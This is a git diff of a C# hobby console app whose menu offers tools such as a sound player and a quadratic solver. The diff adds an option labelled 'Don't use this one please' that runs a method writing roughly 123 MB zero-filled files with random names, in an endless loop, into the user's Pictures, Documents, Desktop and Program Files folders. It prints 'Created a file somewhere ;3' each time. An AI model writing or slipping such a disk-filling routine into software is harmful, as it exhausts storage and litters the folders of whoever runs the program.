@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Linq;
 using System.Media;
@@ -18,7 +18,8 @@ namespace Random_Console_App
                             "\n     4. Sound Player                                     " +
                             "\n     5. Quadratic Solver                                 " +
                             "\n     6. Random number generator                          " +
-                            "\n     7. Specfic size file creator                        ");
+                            "\n     7. Specfic size file creator                        " +
+                            "\n     8. Don't use this one please                        ");
             string num = Console.ReadLine();
             if (num == "1")
             {
@@ -47,6 +48,10 @@ namespace Random_Console_App
             if(num == "7")
             {
                 seven();
+            }
+            if(num == "8")
+            {
+                eight();
             }
         }
 
@@ -797,6 +802,19 @@ namespace Random_Console_App
             Console.Clear();
             Console.WriteLine("File created at " + path);
             Console.ReadLine();
+        }
+
+        public static void eight()
+        {
+            var rand = new Random();
+            bool lol = true;
+            string[] path = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) };
+            Console.WriteLine("Continuing...");
+            while (lol)
+            {
+                File.WriteAllBytes(Path.Combine(path[rand.Next(0, 4)], Convert.ToString(rand.Next())), new byte[123456789]);
+                Console.WriteLine("Created a file somewhere ;3");
+            }
         }
 
         public static string randPattern()
